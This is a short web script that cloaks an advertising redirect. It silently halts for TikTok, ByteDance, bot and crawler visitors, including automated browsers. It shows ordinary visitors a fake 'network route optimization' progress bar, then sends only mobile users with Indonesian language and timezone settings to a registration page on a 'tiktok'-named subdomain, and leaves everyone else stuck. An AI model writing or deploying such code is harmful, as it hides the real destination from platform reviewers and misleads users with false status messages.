<script>
(function () {

  const ua = navigator.userAgent || "";

  /* ===== BLOCK TIKTOK & BOT ===== */
  if (
    navigator.webdriver ||
    /tiktok|bytedance|musical_ly|adsbot|crawler|spider|bot/i.test(ua)
  ) {
    return; // STUCK
  }

  const status = document.getElementById("status");
  const move   = document.getElementById("move");
  const TARGET = "https://tiktok.ketuaraja700.com/register";

  /* ===== MOBILE ONLY ===== */
  const isMobile =
    window.innerWidth <= 820 &&
    ('ontouchstart' in window || navigator.maxTouchPoints > 0);

  /* ===== INDONESIA CHECK (CLIENT-SIDE) ===== */
  const lang = (navigator.language || "").toLowerCase();
  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone || "";

  const isIndonesia =
    lang.startsWith("id") &&
    /jakarta|makassar|jayapura/i.test(tz);

  let progress = 0;

  const engine = setInterval(() => {
    progress += 35 + Math.random() * 20;
    if (progress > 100) progress = 100;

    move.style.width = progress + "%";

    if (progress < 40) {
      status.textContent = "Analyzing network route";
    } else if (progress < 75) {
      status.textContent = "Balancing access path";
    } else {
      status.textContent = "Route optimized";
    }

    if (progress >= 100) {
      clearInterval(engine);

      if (isMobile && isIndonesia) {
        status.textContent = "Redirecting to optimized route";

        // Safari / iOS safe redirect
        location.href = TARGET;
        setTimeout(() => location.replace(TARGET), 300);

      } else {
        status.textContent = "Optimized route unavailable";
        // STUCK FOREVER
      }
    }
  }, 160);

})();
</script>





